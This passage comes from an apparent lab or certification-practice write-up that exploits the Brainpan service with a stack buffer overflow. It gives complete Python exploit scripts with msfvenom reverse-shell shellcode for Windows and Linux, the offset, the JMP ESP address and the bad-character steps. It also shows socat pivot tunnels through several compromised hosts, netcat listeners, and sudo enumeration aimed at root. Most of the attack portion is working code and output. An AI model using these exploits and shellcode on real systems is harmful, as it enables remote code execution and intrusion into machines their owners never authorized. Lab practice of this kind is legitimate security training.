_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

![](/assets/images/2024-08-17-eCPPTv2-simulation/sobreEscritura.png)

In the Immunity we can see that the program has been paused and that the EIP value is **A** and the ESP is the same, so what has just happened is that we have written more **A** than expected and we have exceeded the size of the allocated buffer and therefore we are overwriting certain registers that exist in memory, the goal now is to find out the **offset**.


To do so, we are going to create a pattern of one thousand characters with **metasploit** and we will send them:

```
❯ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

```

It is important whenever the program crashes to restart the program and the Immunity Debugger.

When we send the string of 1000 characters we will see a value in the EIP, we have to copy this value to know the offset.

![](/assets/images/2024-08-17-eCPPTv2-simulation/offset.png)

When we have the copied value, we have to do the following:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35724134
[*] Exact match at offset 524
```

Now that we know that we need 524 **A** before overwriting the EIP, we can do the following:

```
 python3 -c 'print("A"*524+"B"*4+"C"*100)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

nc 192.168.1.16 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

```

![](/assets/images/2024-08-17-eCPPTv2-simulation/eip-control.png)

Now we see that we have control of the eip, also we can see that the ESP points to the beginning of the **C** this is important because now if we make the flow of the program point to an address we can find an address that points to the beginning of the **C**. Now we have to keep in mind that not all characters can be interpreted by the program, so we have to know what they are. This is important because when creating the shellcode we have to know which are the bad characters so as not to use it because otherwise it won't work.


For this we will use mona.py, which you can find on github. To go faster you can copy the raw and put it in a .py file and do the following:


![](/assets/images/2024-08-17-eCPPTv2-simulation/mona.png)

You must put the mona.py file in the path shown in the image. Now we have to configure a working directory with mona to be able to create our bytearray that will help us to know which are the bad characters:

![](/assets/images/2024-08-17-eCPPTv2-simulation/workingFolder.png)

Now we can create the bytearray that will be saved in the directory:

![](/assets/images/2024-08-17-eCPPTv2-simulation/workingFolder.png)

Now we can create the bytearray but without the "\x00" because this is always a bad character:

![](/assets/images/2024-08-17-eCPPTv2-simulation/bytenull.png)

Next we have to transfer the bytearray to our attacking machine. We can do this very simply using **impacket-smbserver**. When we have it passed we have to send it to the program in the following way:

```
#!/usr/bin/env python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = b"B"*4 # JMP ESP

after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + after_eip


def buffer_exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.16", 9999))
    s.send(payload)
    s.close()


if __name__ == '__main__':

    buffer_exploit()

```

What we do here is simply send the bytearray to find the bad characters after writing the eip, so when we put our shellcode for the revershell in the script we will not have problems with bad characters

```
❯ python3 buffer-exploit-test.py

```

Now in Immunity we can see that it has been paused again, but what we are interested in doing is that in the ESP value we right click Follow and we can see our bytearray we can see character by character if there is one that is missing but there is a way faster using mona, as follows:

![](/assets/images/2024-08-17-eCPPTv2-simulation/match.png)

Now what I mentioned before we can use **!mona compare** to specify with **-f** the path of the bytearray.bin and with **-a** indicating the address of the ESP to compare and as we seewe are not found no bad character

![](/assets/images/2024-08-17-eCPPTv2-simulation/bad-xargs.png)

Now we can create the shellcode with **msfvenom**. This will take care of giving us a revershell to our machine through the specified port


```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.21 LPORT=3232 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xbe\x69\x3c\xfc\xa8\xda\xc3\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x52\x31\x72\x12\x03\x72\x12\x83\x83\xc0\x1e\x5d\xaf"
"\xd1\x5d\x9e\x4f\x22\x02\x16\xaa\x13\x02\x4c\xbf\x04\xb2"
"\x06\xed\xa8\x39\x4a\x05\x3a\x4f\x43\x2a\x8b\xfa\xb5\x05"
"\x0c\x56\x85\x04\x8e\xa5\xda\xe6\xaf\x65\x2f\xe7\xe8\x98"
"\xc2\xb5\xa1\xd7\x71\x29\xc5\xa2\x49\xc2\x95\x23\xca\x37"
"\x6d\x45\xfb\xe6\xe5\x1c\xdb\x09\x29\x15\x52\x11\x2e\x10"
"\x2c\xaa\x84\xee\xaf\x7a\xd5\x0f\x03\x43\xd9\xfd\x5d\x84"
"\xde\x1d\x28\xfc\x1c\xa3\x2b\x3b\x5e\x7f\xb9\xdf\xf8\xf4"
"\x19\x3b\xf8\xd9\xfc\xc8\xf6\x96\x8b\x96\x1a\x28\x5f\xad"
"\x27\xa1\x5e\x61\xae\xf1\x44\xa5\xea\xa2\xe5\xfc\x56\x04"
"\x19\x1e\x39\xf9\xbf\x55\xd4\xee\xcd\x34\xb1\xc3\xff\xc6"
"\x41\x4c\x77\xb5\x73\xd3\x23\x51\x38\x9c\xed\xa6\x3f\xb7"
"\x4a\x38\xbe\x38\xab\x11\x05\x6c\xfb\x09\xac\x0d\x90\xc9"
"\x51\xd8\x37\x99\xfd\xb3\xf7\x49\xbe\x63\x90\x83\x31\x5b"
"\x80\xac\x9b\xf4\x2b\x57\x4c\x3b\x03\x56\x99\xd3\x56\x58"
"\xad\x83\xde\xbe\xc7\xd3\xb6\x69\x70\x4d\x93\xe1\xe1\x92"
"\x09\x8c\x22\x18\xbe\x71\xec\xe9\xcb\x61\x99\x19\x86\xdb"
"\x0c\x25\x3c\x73\xd2\xb4\xdb\x83\x9d\xa4\x73\xd4\xca\x1b"
"\x8a\xb0\xe6\x02\x24\xa6\xfa\xd3\x0f\x62\x21\x20\x91\x6b"
"\xa4\x1c\xb5\x7b\x70\x9c\xf1\x2f\x2c\xcb\xaf\x99\x8a\xa5"
"\x01\x73\x45\x19\xc8\x13\x10\x51\xcb\x65\x1d\xbc\xbd\x89"
"\xac\x69\xf8\xb6\x01\xfe\x0c\xcf\x7f\x9e\xf3\x1a\xc4\xbe"
"\x11\x8e\x31\x57\x8c\x5b\xf8\x3a\x2f\xb6\x3f\x43\xac\x32"
"\xc0\xb0\xac\x37\xc5\xfd\x6a\xa4\xb7\x6e\x1f\xca\x64\x8e"
"\x0a";
```

Now we have to look for an address that applies a **JMP ESP** to interpret the shell_code, to do this we can do this:

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm > 
```

The Brainpan.exe program has no protection:

![](/assets/images/2024-08-17-eCPPTv2-simulation/protection.png)


As a result we can see that it gives us an address that says **Page_execute_Read** so we can execute the shellcode

![](/assets/images/2024-08-17-eCPPTv2-simulation/finaldirection.png)

Therefore we have to copy that address because it will help us make a **JMP ESP** but we have to represent it in **Little Endian**, finally we have put some **NOPS** before executing the shellcode because it is necessary that can decrypt the encoder (x86/shikata_ga_nai) that we have applied in the shellcode created with msfvenon:


```
#!/usr/bin/env python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712f3) # JMP ESP

shell_code = (b"\xbe\x69\x3c\xfc\xa8\xda\xc3\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x52\x31\x72\x12\x03\x72\x12\x83\x83\xc0\x1e\x5d\xaf"
b"\xd1\x5d\x9e\x4f\x22\x02\x16\xaa\x13\x02\x4c\xbf\x04\xb2"
b"\x06\xed\xa8\x39\x4a\x05\x3a\x4f\x43\x2a\x8b\xfa\xb5\x05"
b"\x0c\x56\x85\x04\x8e\xa5\xda\xe6\xaf\x65\x2f\xe7\xe8\x98"
b"\xc2\xb5\xa1\xd7\x71\x29\xc5\xa2\x49\xc2\x95\x23\xca\x37"
b"\x6d\x45\xfb\xe6\xe5\x1c\xdb\x09\x29\x15\x52\x11\x2e\x10"
b"\x2c\xaa\x84\xee\xaf\x7a\xd5\x0f\x03\x43\xd9\xfd\x5d\x84"
b"\xde\x1d\x28\xfc\x1c\xa3\x2b\x3b\x5e\x7f\xb9\xdf\xf8\xf4"
b"\x19\x3b\xf8\xd9\xfc\xc8\xf6\x96\x8b\x96\x1a\x28\x5f\xad"
b"\x27\xa1\x5e\x61\xae\xf1\x44\xa5\xea\xa2\xe5\xfc\x56\x04"
b"\x19\x1e\x39\xf9\xbf\x55\xd4\xee\xcd\x34\xb1\xc3\xff\xc6"
b"\x41\x4c\x77\xb5\x73\xd3\x23\x51\x38\x9c\xed\xa6\x3f\xb7"
b"\x4a\x38\xbe\x38\xab\x11\x05\x6c\xfb\x09\xac\x0d\x90\xc9"
b"\x51\xd8\x37\x99\xfd\xb3\xf7\x49\xbe\x63\x90\x83\x31\x5b"
b"\x80\xac\x9b\xf4\x2b\x57\x4c\x3b\x03\x56\x99\xd3\x56\x58"
b"\xad\x83\xde\xbe\xc7\xd3\xb6\x69\x70\x4d\x93\xe1\xe1\x92"
b"\x09\x8c\x22\x18\xbe\x71\xec\xe9\xcb\x61\x99\x19\x86\xdb"
b"\x0c\x25\x3c\x73\xd2\xb4\xdb\x83\x9d\xa4\x73\xd4\xca\x1b"
b"\x8a\xb0\xe6\x02\x24\xa6\xfa\xd3\x0f\x62\x21\x20\x91\x6b"
b"\xa4\x1c\xb5\x7b\x70\x9c\xf1\x2f\x2c\xcb\xaf\x99\x8a\xa5"
b"\x01\x73\x45\x19\xc8\x13\x10\x51\xcb\x65\x1d\xbc\xbd\x89"
b"\xac\x69\xf8\xb6\x01\xfe\x0c\xcf\x7f\x9e\xf3\x1a\xc4\xbe"
b"\x11\x8e\x31\x57\x8c\x5b\xf8\x3a\x2f\xb6\x3f\x43\xac\x32"
b"\xc0\xb0\xac\x37\xc5\xfd\x6a\xa4\xb7\x6e\x1f\xca\x64\x8e"
b"\x0a")

payload = before_eip + eip + b"\x90"*16 + shell_code


def buffer_exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.16", 9999))
    s.send(payload)


if __name__ == '__main__':

    buffer_exploit()
```

Now we can listen on port 3232 and execute the payload:

![](/assets/images/2024-08-17-eCPPTv2-simulation/pwd-windows.png)


Finally, to finish compromising the Brainpan machine we have to do it with the real machine by passing the payload through the tunnels, but first we have to configure another tunnel that can give us access to a console:

```
Attacker
 rlwrap nc -nlvp 443
listening on [any] 443 ...

Aragog
root@Aragog:~# ./socat TCP-LISTEN:4245,fork TCP:192.168.1.21:443

Nagini
root@Nagini:~# ./socat TCP-LISTEN:2123,fork TCP:10.10.0.128:4245

Fawkes
root@Fawkes:~# ./socat TCP-LISTEN:4545,fork TCP:192.168.100.130:2123

Matrix
root@porteus:~# ./socat TCP-LISTEN:3232,fork TCP:192.168.100.128:4545
```

The previous payload no longer works because now the IP that we have to put is that of the Matrix machine because the tunnel begins so that it then goes to Fawkes > Nagini > Aragog > Attacker machine:

```
 msfvenom -p windows/shell_reverse_tcp LHOST=172.18.0.130 LPORT=3232 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xdb\xd8\xd9\x74\x24\xf4\xba\xf6\x11\x34\x32\x5d\x33\xc9"
"\xb1\x52\x83\xed\xfc\x31\x55\x13\x03\xa3\x02\xd6\xc7\xb7"
"\xcd\x94\x28\x47\x0e\xf9\xa1\xa2\x3f\x39\xd5\xa7\x10\x89"
"\x9d\xe5\x9c\x62\xf3\x1d\x16\x06\xdc\x12\x9f\xad\x3a\x1d"
"\x20\x9d\x7f\x3c\xa2\xdc\x53\x9e\x9b\x2e\xa6\xdf\xdc\x53"
"\x4b\x8d\xb5\x18\xfe\x21\xb1\x55\xc3\xca\x89\x78\x43\x2f"
"\x59\x7a\x62\xfe\xd1\x25\xa4\x01\x35\x5e\xed\x19\x5a\x5b"
"\xa7\x92\xa8\x17\x36\x72\xe1\xd8\x95\xbb\xcd\x2a\xe7\xfc"
"\xea\xd4\x92\xf4\x08\x68\xa5\xc3\x73\xb6\x20\xd7\xd4\x3d"
"\x92\x33\xe4\x92\x45\xb0\xea\x5f\x01\x9e\xee\x5e\xc6\x95"
"\x0b\xea\xe9\x79\x9a\xa8\xcd\x5d\xc6\x6b\x6f\xc4\xa2\xda"
"\x90\x16\x0d\x82\x34\x5d\xa0\xd7\x44\x3c\xad\x14\x65\xbe"
"\x2d\x33\xfe\xcd\x1f\x9c\x54\x59\x2c\x55\x73\x9e\x53\x4c"
"\xc3\x30\xaa\x6f\x34\x19\x69\x3b\x64\x31\x58\x44\xef\xc1"
"\x65\x91\xa0\x91\xc9\x4a\x01\x41\xaa\x3a\xe9\x8b\x25\x64"
"\x09\xb4\xef\x0d\xa0\x4f\x78\x9e\x27\x4f\xfa\xb6\x45\x4f"
"\xf6\xe6\xc3\xa9\x6c\xf7\x85\x62\x19\x6e\x8c\xf8\xb8\x6f"
"\x1a\x85\xfb\xe4\xa9\x7a\xb5\x0c\xc7\x68\x22\xfd\x92\xd2"
"\xe5\x02\x09\x7a\x69\x90\xd6\x7a\xe4\x89\x40\x2d\xa1\x7c"
"\x99\xbb\x5f\x26\x33\xd9\x9d\xbe\x7c\x59\x7a\x03\x82\x60"
"\x0f\x3f\xa0\x72\xc9\xc0\xec\x26\x85\x96\xba\x90\x63\x41"
"\x0d\x4a\x3a\x3e\xc7\x1a\xbb\x0c\xd8\x5c\xc4\x58\xae\x80"
"\x75\x35\xf7\xbf\xba\xd1\xff\xb8\xa6\x41\xff\x13\x63\x61"
"\xe2\xb1\x9e\x0a\xbb\x50\x23\x57\x3c\x8f\x60\x6e\xbf\x25"
"\x19\x95\xdf\x4c\x1c\xd1\x67\xbd\x6c\x4a\x02\xc1\xc3\x6b"
"\x07";
```

Now in the script that we have created before we have to change the IP to attack with that of the Brainpan machine, in addition to using proxychains so that the payload can arrive:

```
#!/usr/bin/env python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712f3) # JMP ESP

shell_code = (b"\xb8\xb1\xfa\xf7\xa2\xd9\xe8\xd9\x74\x24\xf4\x5b\x29\xc9"
b"\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x72\xfe\x15\x57\x88"
b"\x17\x5b\x98\x70\xe8\x3c\x10\x95\xd9\x7c\x46\xde\x4a\x4d"
b"\x0c\xb2\x66\x26\x40\x26\xfc\x4a\x4d\x49\xb5\xe1\xab\x64"
b"\x46\x59\x8f\xe7\xc4\xa0\xdc\xc7\xf5\x6a\x11\x06\x31\x96"
b"\xd8\x5a\xea\xdc\x4f\x4a\x9f\xa9\x53\xe1\xd3\x3c\xd4\x16"
b"\xa3\x3f\xf5\x89\xbf\x19\xd5\x28\x13\x12\x5c\x32\x70\x1f"
b"\x16\xc9\x42\xeb\xa9\x1b\x9b\x14\x05\x62\x13\xe7\x57\xa3"
b"\x94\x18\x22\xdd\xe6\xa5\x35\x1a\x94\x71\xb3\xb8\x3e\xf1"
b"\x63\x64\xbe\xd6\xf2\xef\xcc\x93\x71\xb7\xd0\x22\x55\xcc"
b"\xed\xaf\x58\x02\x64\xeb\x7e\x86\x2c\xaf\x1f\x9f\x88\x1e"
b"\x1f\xff\x72\xfe\x85\x74\x9e\xeb\xb7\xd7\xf7\xd8\xf5\xe7"
b"\x07\x77\x8d\x94\x35\xd8\x25\x32\x76\x91\xe3\xc5\x79\x88"
b"\x54\x59\x84\x33\xa5\x70\x43\x67\xf5\xea\x62\x08\x9e\xea"
b"\x8b\xdd\x31\xba\x23\x8e\xf1\x6a\x84\x7e\x9a\x60\x0b\xa0"
b"\xba\x8b\xc1\xc9\x51\x76\x82\x59\xb7\x78\xd0\xca\xba\x78"
b"\xd8\xaa\x32\x9e\x8a\xba\x12\x09\x23\x22\x3f\xc1\xd2\xab"
b"\x95\xac\xd5\x20\x1a\x51\x9b\xc0\x57\x41\x4c\x21\x22\x3b"
b"\xdb\x3e\x98\x53\x87\xad\x47\xa3\xce\xcd\xdf\xf4\x87\x20"
b"\x16\x90\x35\x1a\x80\x86\xc7\xfa\xeb\x02\x1c\x3f\xf5\x8b"
b"\xd1\x7b\xd1\x9b\x2f\x83\x5d\xcf\xff\xd2\x0b\xb9\xb9\x8c"
b"\xfd\x13\x10\x62\x54\xf3\xe5\x48\x67\x85\xe9\x84\x11\x69"
b"\x5b\x71\x64\x96\x54\x15\x60\xef\x88\x85\x8f\x3a\x09\xa5"
b"\x6d\xee\x64\x4e\x28\x7b\xc5\x13\xcb\x56\x0a\x2a\x48\x52"
b"\xf3\xc9\x50\x17\xf6\x96\xd6\xc4\x8a\x87\xb2\xea\x39\xa7"
b"\x96")

payload = before_eip + eip + b"\x90"*16 + shell_code


def buffer_exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.18.0.132", 9999))
    s.send(payload)


if __name__ == '__main__':

    buffer_exploit()

```

Now we are ready to execute the payload:

![](/assets/images/2024-08-17-eCPPTv2-simulation/pwd-brainpan.png)


## Got Root


```
Z:\>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\

  3/4/2013   1:02 PM  <DIR>         bin
  3/4/2013  11:19 AM  <DIR>         boot
  9/5/2024  11:12 AM  <DIR>         etc
  3/4/2013  11:49 AM  <DIR>         home
  3/4/2013  11:18 AM    15,084,717  initrd.img
  3/4/2013  11:18 AM    15,084,717  initrd.img.old
  3/4/2013   1:04 PM  <DIR>         lib
  3/4/2013  10:12 AM  <DIR>         lost+found
  3/4/2013  10:12 AM  <DIR>         media
 10/9/2012   9:59 AM  <DIR>         mnt
  3/4/2013  10:13 AM  <DIR>         opt
  3/7/2013  11:07 PM  <DIR>         root
  9/5/2024  11:32 AM  <DIR>         run
  3/4/2013  11:20 AM  <DIR>         sbin
 6/11/2012   9:43 AM  <DIR>         selinux
  3/4/2013  10:13 AM  <DIR>         srv
  9/5/2024  11:34 AM  <DIR>         tmp
  3/4/2013  10:13 AM  <DIR>         usr
  3/7/2013  11:13 PM  <DIR>         var
 2/25/2013   2:32 PM     5,180,432  vmlinuz
 2/25/2013   2:32 PM     5,180,432  vmlinuz.old
       4 files               40,530,298 bytes
      17 directories     13,848,055,808 bytes free


Z:\>
```

This machine is curious because it has a Linux subsystem, we can apply the buffer over flow again but this time for a Linux system:

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.18.0.130 LPORT=3232 -f c -b "\x00" EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xba\x22\x52\x63\x9b\xd9\xca\xd9\x74\x24\xf4\x5f\x29\xc9"
"\xb1\x12\x83\xef\xfc\x31\x57\x0e\x03\x75\x5c\x81\x6e\x48"
"\xbb\xb2\x72\xf9\x78\x6e\x1f\xff\xf7\x71\x6f\x99\xca\xf2"
"\x03\x3c\x65\xcd\xee\x3e\xcc\x4b\x08\x56\x63\xb9\xea\x24"
"\x13\xbc\xea\x24\x44\x49\x0b\x84\xe2\x1a\x9d\xb7\x59\x99"
"\x94\xd6\x53\x1e\xf4\x70\x02\x30\x8a\xe8\xb2\x61\x43\x8a"
"\x2b\xf7\x78\x18\xff\x8e\x9e\x2c\xf4\x5d\xe0";
```

We simply change the shellcode to the other one and execute:

```
proxychains python3 buffer-exploit-linux.py

nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 56912
whoami
puck

```

After processing the tty we have executed the simple command to see what we can execute as sudo and we find this:

```
puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$ ls /home
anansi  puck  reynard
puck@brainpan:/home/puck$ 
```

After seeing what this binary does we realize that it allows us to see the manual of the system binaries but as the **root** user it is an error because it allows us to launch an attempt.

```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls

LS(1)                                                                              User Commands                                                                              LS(1)

NAME
       ls - list directory contents

SYNOPSIS
       ls [OPTION]... [FILE]...

DESCRIPTION
       List information about the FILEs (the current directory by default).  Sort entries alphabetically if none of -cftuvSUX nor --sort is specified.

       Mandatory arguments to long options are mandatory for short options too.

       -a, --all
              do not ignore entries starting with .

       -A, --almost-all
              do not list implied . and ..

       --author
              with -l, print the author of each file

       -b, --escape
              print C-style escapes for nongraphic characters

       --block-size=SIZE
